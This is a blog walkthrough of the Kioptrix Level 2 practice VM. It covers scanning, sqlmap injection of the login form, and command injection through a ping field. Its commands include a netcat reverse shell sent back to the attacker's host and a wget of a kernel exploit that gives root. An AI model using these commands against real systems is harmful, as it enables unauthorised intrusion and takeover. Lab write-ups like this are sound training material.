---
layout:		post
title:  	"Kioptrix Level 2"
date: 		2018-02-26 14:00:00 +0800
summary:	Today we are going to solve Kioptrix Level 2. First we need to...
categories:	kioptrix
---
Today we are going to solve Kioptrix Level 2. First we need to download the VM from the kioptrix website, add it to VMware and power it up!

We are met with this image:

![Kioptrix Login](/assets/kioptrix-start.png){: .center-image }

Let's get started. From my Kali machine I'm going to run an nmap scan, this will scan the entire network and we should be able to find the IP address of the Kioptrix machine. 

![nmap scan](/assets/nmap scan.PNG){: .center-image }

The nmap scan has brought back a number of open ports. The most interesting here would be the port 3306, the MySQL port. Let's look a bit further into that.

To do this we're going to use Metasploit. First we need to find out what version of MySQL is on the Kioptrix machine. We will do this with the following

{% highlight ruby %}
use auxiliary/scanner/mysql/mysql_version
#We then need to set a couple of parameters
set rhosts 192.168.1.101 #	This is the Kioptrix Machine IP 
			 #	that we found in the nmap scan
set rport 3306 #This is the open mysql port
run
{% endhighlight %}
<br>
<br>
![mysql](/assets/mysql version result.PNG){: .center-image }
<br>
<br>
Well, that didn't really get us anywhere. At least we know it is mySQL. Let's launch a browser, go to the IP address and see what we are greeted with. 
<br>
<br>
![landing](/assets/web landing page.PNG){: .center-image }
<br>
<br>
A login page. Let's use burpsuite, intercept the login and see what we can find out. 
<br>
<br>
![burpsuite](/assets/burpsuite.PNG){: .center-image }
<br>
<br>
Burpsuite has intercepted the login! Let's use this with sqlmap to try and get a workaround. 
<br>
In terminal we write:
<br>
{% highlight ruby %}
sqlmap -u "http://192.168.1.101/index.php" --data "uname=admin&psw=password&btnLogin=Login" --level=5 --risk=3
{% endhighlight %}
<br>
<br>
-u is for URL<br>
--data this is where we put the data from our burpsuite intercept<br>
--level is level of tests to perform from 1-5, may as well max it out<br>
--risk is risk of tests 1-3, same again, max it out. As this isn't a real-world test we don't have to worry too much about the risk or level of attacks. <br>
<br>
![sqlmap complete](/assets/sqlmap-complete.PNG){: .center-image }
<br><br>
sqlmap has completed and found multiple injection points. Let's just use the username POST injection, we can do this in burpsuite by replacing the original code with the injection code. 
<br><br>
Now we are at this page:
<br><br>
![web after login](/assets/webpage after login.PNG){: .center-image }
<br><br>
What we need to now do is see if this textbox will run extra commands for us. Let's ping the Kioptrix machine and add {% highlight ruby %}; ls -l{% endhighlight %} and see if it brings back a list of files and owner of those files.

Sure enough, it does! Let's use another handy tool bundled in Kali, netcat

First we need to work out the location to put netcat on the Kioptrix machine. For this we use "; find / -name nc 2>/dev/null" into the webpage. This brings back "/usr/local/bin/nc". 

In Terminal, we get netcat listening with <br>{% highlight ruby %}nc -lvp 1111{% endhighlight %}<br>I used port 1111, you can use whatever port you wish. 
<br>
Then back in the webapp textbox we need to input<br>{% highlight ruby %}; /usr/local/bin/nc 192.168.1.5 -e '/bin/bash' 1111{% endhighlight %}
<br><br><br>
Now we've got a netcat connection going! Let's get some more information about the kernel. A quick {% highlight ruby %}uname -a{% endhighlight %} shows us this:
<br><br>
![uname](/assets/kernel.PNG){: .center-image }
<br><br>
We now know it's Linux Kernel 2.6.9-55 - Let's google an exploit! <a href="http://www.exploit-db.com/exploits/9542/">This exploit</a> seems like it's gonna work for us! It's been tested on a similar machine to this one. <br><br>Let's save that to "/var/www/html", start Apache on our Kali machine and download the exploit through the session we created with netcat.

Okay, to download it let's first cd to /tmp. Now we can wget from our apache server, compile and execute!

![root](/assets/root.PNG){: .center-image }

Done! We are now root. I'll just change the password and login via the VM.

![have root](/assets/haveroot.PNG){: .center-image }


Thanks guys!
